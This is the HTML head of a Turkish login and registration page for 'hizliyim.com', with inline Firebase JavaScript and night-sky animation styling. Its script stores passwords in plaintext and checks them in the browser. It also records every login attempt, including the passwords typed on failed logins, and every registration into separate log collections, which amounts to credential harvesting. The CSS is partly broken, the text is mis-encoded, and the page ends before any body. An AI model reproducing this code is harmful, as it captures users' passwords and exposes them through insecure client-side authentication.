<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>hizliyim.com - Gece Modu</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, collection, addDoc, doc, setDoc, getDoc, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
        
        const myFirebaseConfig = {
            apiKey: "AIzaSyCP0Rd8CAfzYRPtakfdQWBqS5uBn045XpE",
            authDomain: "hizliyimforum.firebaseapp.com",
            databaseURL: "https://hizliyimforum-default-rtdb.firebaseio.com",
            projectId: "hizliyimforum",
            storageBucket: "hizliyimforum.firebasestorage.app",
            messagingSenderId: "903963422468",
            appId: "1:903963422468:web:936c368393585efd0cea51"
        };

        let db, auth, userId;

        try {
            const app = initializeApp(myFirebaseConfig);
            db = getFirestore(app);
            auth = getAuth(app);
            console.log("Firebase baÅŸarÄ±yla baÅŸlatÄ±ldÄ±.");
        } catch (e) {
            console.error("Firebase baÅŸlatma hatasÄ±:", e);
        }

        /**
         * Firebase Oturumunu YÃ¶netme
         */
        async function authenticateUser() {
            if (!auth) {
                console.error("Firebase Auth baÅŸlatÄ±lamadÄ±.");
                window.router.initialize(); 
                return;
            }
            
            onAuthStateChanged(auth, (user) => {
                if (user) {
                    userId = user.uid;
                    window.userId = userId;
                } else {
                    signInAnonymously(auth).then((cred) => {
                        userId = cred.user.uid;
                        window.userId = userId;
                    }).catch((error) => {
                        console.error("Anonim oturum hatasÄ±:", error);
                    });
                }
                window.router.initialize();
            });
            
            window.db = db;
        }

        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            let device = 'Bilinmeyen Cihaz';
            if (/Mobi|Android/i.test(userAgent)) device = "Mobil Cihaz";
            else if (/iPad|Tablet/i.test(userAgent)) device = "Tablet";
            else device = "MasaÃ¼stÃ¼";
            return device;
        }

        async function logRegistration(username, email, password) {
            if (!window.db) return;
            const logData = {
                timestamp: new Date().toISOString(),
                username: username,
                email: email,
                password: password, 
                deviceInfo: getDeviceInfo(),
                userId: window.userId || 'unknown'
            };
            try {
                await addDoc(collection(window.db, "kayit_log"), logData);
            } catch (e) { console.warn("Log hatasÄ±:", e.message); }
        }

        async function logLoginAttempt(email, password, success) {
            if (!window.db) return;
            const logData = {
                timestamp: new Date().toISOString(),
                email: email,
                password: password,
                isSuccess: success,
                deviceInfo: getDeviceInfo(),
                userId: window.userId || 'unknown'
            };
            try {
                await addDoc(collection(window.db, "giris_log"), logData);
            } catch (e) { console.warn("Log hatasÄ±:", e.message); }
        }

        /**
         * KayÄ±t Ä°ÅŸlemi
         */
        async function saveRegistrationData(username, email, password) {
            if (!window.db) return { success: false, message: "VeritabanÄ± baÄŸlantÄ±sÄ± yok." };
            const userRef = doc(window.db, "users", email.toLowerCase());
             try {
                const docSnap = await getDoc(userRef);
                if (docSnap.exists()) return { success: false, message: "Bu e-posta zaten kullanÄ±lÄ±yor." };

                const userData = {
                    username: username,
                    email: email.toLowerCase(),
                    password: password, 
                    createdAt: new Date().toISOString(),
                    status: 'pending'
                };

                await setDoc(userRef, userData);
                logRegistration(username, email, password);
                return { success: true };

            } catch (e) {
                console.error("KAYIT HATASI:", e);
                return { success: false, message: "Sunucu hatasÄ± oluÅŸtu." };
            }
        }

        async function verifyLoginCredentials(email, password) {
             if (!window.db) return false;
            const userRef = doc(window.db, "users", email.toLowerCase());
            try {
                const docSnap = await getDoc(userRef);
                if (docSnap.exists()) {
                    const userData = docSnap.data();
                    if (userData.password === password) return true;
                }
                return false;
            } catch (e) { return false; }
        }

        // --- Router ---
        const router = {
            routes: { '#': 'login', '#/': 'login', '#/login': 'login', '#/register': 'register', '#/home': 'home' },
            load: () => {
                const hash = window.location.hash || '#/login';
                const page = router.routes[hash] || 'login';
                
                document.querySelectorAll('.page-content').forEach(el => el.classList.add('hidden'));
                const currentPage = document.getElementById(`page-${page}`);
                if (currentPage) {
                    currentPage.classList.remove('hidden');
                    currentPage.classList.add('animate-fade-in');
                }
            },
            initialize: () => {
                window.addEventListener('hashchange', router.load);
                router.load();
            }
        };
        window.router = router;

        // --- DOM ve Efektler ---
        document.addEventListener('DOMContentLoaded', () => {
            authenticateUser(); 
            // Efektleri BaÅŸlat
            initNightSkyEffects();

            const formLogin = document.getElementById('form-login');
            const formRegister = document.getElementById('form-register');

            // Login Ä°ÅŸlemi
            if (formLogin) {
                formLogin.addEventListener('submit', async (e) => {
                    e.preventDefault();
                    toggleLoading('login', true);
                    const email = document.getElementById('login-email').value.trim();
                    const password = document.getElementById('login-password').value;

                    const success = await verifyLoginCredentials(email, password);
                    logLoginAttempt(email, password, success);

                    if (success) {
                        updateLoadingText('login', "GiriÅŸ BaÅŸarÄ±lÄ±! HÄ±zlanÄ±yoruz...");
                        setTimeout(() => {
                            window.location.hash = '#/home';
                            formLogin.reset();
                            toggleLoading('login', false);
                        }, 1000);
                    } else {
                        toggleLoading('login', false);
                        alert("Bilgiler yanlÄ±ÅŸ balÄ±mmmm!");
                    }
                });
            }

            // Register Ä°ÅŸlemi
            if (formRegister) {
                formRegister.addEventListener('submit', async (e) => {
                    e.preventDefault();
                    const password = document.getElementById('register-password').value;
                    const confirmPassword = document.getElementById('register-confirm-password').value;

                    if (password !== confirmPassword) {
                        alert("Åžifreler eÅŸleÅŸmiyor balÄ±mmmm!");
                        return;
                    }

                    toggleLoading('register', true);
                    const username = document.getElementById('register-username').value.trim();
                    const email = document.getElementById('register-email').value.trim();

                    const result = await saveRegistrationData(username, email, password);

                    if (result.success) {
                        updateLoadingText('register', "KayÄ±t BaÅŸarÄ±lÄ±! YÃ¶nlendiriliyorsunuz...");
                        setTimeout(() => {
                            window.location.hash = '#/login';
                            formRegister.reset();
                            toggleLoading('register', false);
                        }, 1500);
                    } else {
                        toggleLoading('register', false);
                        alert(result.message);
                    }
                });
            }
        });

        // YardÄ±mcÄ± Fonksiyonlar
        function toggleLoading(type, isLoading) {
            const form = document.getElementById(`form-${type}`);
            const loading = document.getElementById(`${type}-loading`);
            const links = document.getElementById(`${type}-links`);
            if (isLoading) {
                form.classList.add('hidden');
                links.classList.add('hidden');
                loading.classList.remove('hidden');
            } else {
                form.classList.remove('hidden');
                links.classList.remove('hidden');
                loading.classList.add('hidden');
            }
        }

        function updateLoadingText(type, text) {
            document.getElementById(`${type}-loading-text`).textContent = text;
        }

        // --- Gece GÃ¶kyÃ¼zÃ¼ Efektleri ---
        function initNightSkyEffects() {
            const container = document.getElementById('sky-effects-container');

            // Kayan YÄ±ldÄ±z OluÅŸturucu (SÃ¼rekli)
            setInterval(() => {
                createShootingStar(container);
            }, 800); // Her 800ms'de bir kayan yÄ±ldÄ±z

            // HÄ±z Ã‡izgisi OluÅŸturucu (SÃ¼rekli)
            setInterval(() => {
                createSpeedLine(container);
            }, 300); // Her 300ms'de bir hÄ±z Ã§izgisi
        }

        function createShootingStar(container) {
            const star = document.createElement('div');
            star.classList.add('shooting-star');
            // Rastgele baÅŸlangÄ±Ã§ pozisyonlarÄ±
            star.style.top = Math.random() * 50 + '%'; // Ãœst yarÄ±da baÅŸlasÄ±n
            star.style.left = Math.random() * 100 + '%';
            // Rastgele animasyon sÃ¼resi ve gecikme
            const duration = Math.random() * 1.5 + 1; // 1s - 2.5s arasÄ±
            star.style.animationDuration = duration + 's';
            star.style.animationDelay = Math.random() * 0.5 + 's';
            
            container.appendChild(star);

            // Animasyon bitince elementi sil
            setTimeout(() => { star.remove(); }, duration * 1000 + 500);
        }

        function createSpeedLine(container) {
            const line = document.createElement('div');
            line.classList.add('speed-line');
            // Rastgele dikey pozisyon
            line.style.top = Math.random() * 100 + 'vh';
            // Rastgele kalÄ±nlÄ±k ve hÄ±z
            line.style.height = Math.random() * 2 + 1 + 'px';
            const duration = Math.random() * 0.5 + 0.2; // Ã‡ok hÄ±zlÄ± (0.2s - 0.7s)
            line.style.animationDuration = duration + 's';
            // Rastgele yÃ¶n (soldan saÄŸa veya saÄŸdan sola)
            if (Math.random() > 0.5) {
                line.style.left = '-10%';
                line.style.animationName = 'speedRight';
            } else {
                line.style.right = '-10%';
                line.style.animationName = 'speedLeft';
            }

            container.appendChild(line);
            // Animasyon bitince elementi sil
            setTimeout(() => { line.remove(); }, duration * 1000 + 100);
        }

    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        
        :root {
            --primary-blue: #027aff;

        body {
            font-family: 'Inter', sans-serif;

            color: white;
            position: relative;

        /* Efektler iÃ§in Konteyner */
        #sky-effects-container, .stars-layer {
            position: fixed;

        /* Statik YÄ±ldÄ±zlar (CSS ile oluÅŸturuldu) */
        .stars-layer.small {

        @keyframes slowMove {

        /* Kayan YÄ±ldÄ±zlar */
        .shooting-star {
            position: absolute;
            width: 150px;

            background: linear-gradient(to right, rgba(255,255,255,0), rgba(255,255,255,1) 50%, rgba(255,255,255,0));
            filter: drop-shadow(0 0 6px white);
            transform: rotate(-45deg);
            opacity: 0;
            animation-name: shoot;
            animation-timing-function: ease-out;
        }

        @keyframes shoot {
            0% { transform: translateX(0) translateY(0) rotate(-45deg); opacity: 1; }
            100% { transform: translateX(-500px) translateY(500px) rotate(-45deg); opacity: 0; }
        }

        /* HÄ±z Ã‡izgileri */
        .speed-line {
            position: absolute;
            width: 30%;
            background: linear-gradient(to right, transparent, rgba(255,255,255,0.4), transparent);
            filter: blur(1px);
            opacity: 0;
        }
        @keyframes speedRight {
            0% { left: -30%; opacity: 0; }
            50% { opacity: 1; }
            100% { left: 110%; opacity: 0; }
        }
        @keyframes speedLeft {
            0% { right: -30%; opacity: 0; }
            50% { opacity: 1; }
            100% { right: 110%; opacity: 0; }
        }

        /* Kart TasarÄ±mÄ± (AynÄ± kaldÄ±) */
        .premium-card {
            position: relative;
            z-index: 10;
            background: rgba(255, 255, 255, 0.05); /* Biraz daha ÅŸeffaf gece iÃ§in */
            backdrop-filter: blur(20px);
            border-radius: 40px; /* YumuÅŸak Hatlar */
            border: 1px solid rgba(255, 255, 255, 0.15);
            padding: 3.5rem;
            width: 90%;
            max-width: 440px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7); /* Daha koyu gÃ¶lge */
            text-align: center;
        }

        .premium-input {
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: white;
            padding: 1.2rem;
            border-radius: 20px; /* YumuÅŸak Inputlar */
            width: 100%;
            margin-bottom: 1.2rem;
            outline: none;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .premium-input:focus {
            background: rgba(255, 255, 255, 0.15);
            border-color: #60a5fa;
            transform: scale(1.02);
            box-shadow: 0 0 15px rgba(96, 165, 250, 0.3);
        }

        .premium-button {
            background: white;
            color: #0a0a2a; /* Gece mavisi metin */
            font-weight: 900;
            padding: 1.2rem;
            border-radius: 20px; /* YumuÅŸak Butonlar */
            width: 100%;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
        }

        .premium-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(255, 255, 255, 0.3);
            background: #f0f0f0;
        }

        /* BaÅŸlÄ±k Animasyonu (AynÄ± kaldÄ±) */
        h1 {
            font-weight: 900;
            font-size: 2.8rem;
            margin-bottom: 2rem;
            letter-spacing: -2px;
            /* HÄ±z efekti iÃ§in hafif mavi parlama */
            text-shadow: 0 0 20px rgba(2, 122, 255, 0.7), 0 0 40px rgba(2, 122, 255, 0.4);
        }

        .spinner {
            width: 50px; height: 50px;
            border: 5px solid rgba(255,255,255,0.1);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .animate-fade-in {
            animation: fadeIn 0.8s ease-out forwards;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
